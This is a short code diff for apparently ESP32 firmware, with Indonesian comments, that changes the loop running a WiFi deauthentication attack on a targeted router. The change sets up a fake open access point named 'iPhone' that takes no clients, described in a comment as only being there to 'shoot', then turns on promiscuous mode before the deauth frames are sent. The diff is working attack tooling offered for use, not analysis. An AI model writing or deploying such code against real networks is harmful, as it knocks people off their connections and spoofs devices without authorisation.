@@ -108,7 +108,15 @@ void loopWiFi(void * pvParameters) {
       triggerScan = false; // Matiin pelatuknya
     } else if (isDeauthing && adaTarget) {
     // 1. PINDAH MODE KE AP (Biar lebih sakti kayak GhostESP)
-    esp_wifi_set_mode(WIFI_MODE_AP); 
+    wifi_config_t ap_config = {};
+    const char* fakeName = "iPhone";
+    memcpy(ap_config.ap.ssid, fakeName, strlen(fakeName));
+    ap_config.ap.ssid_len = strlen(fakeName);
+    ap_config.ap.authmode = WIFI_AUTH_OPEN; // Biar gak ribet
+    ap_config.ap.max_connection = 0;        // Gak nerima tamu, cuma nembak doang
+
+    esp_wifi_set_mode(WIFI_MODE_AP);
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config); 
     esp_wifi_set_promiscuous(true);
     
     uint8_t targetMac[6]; // MAC Router
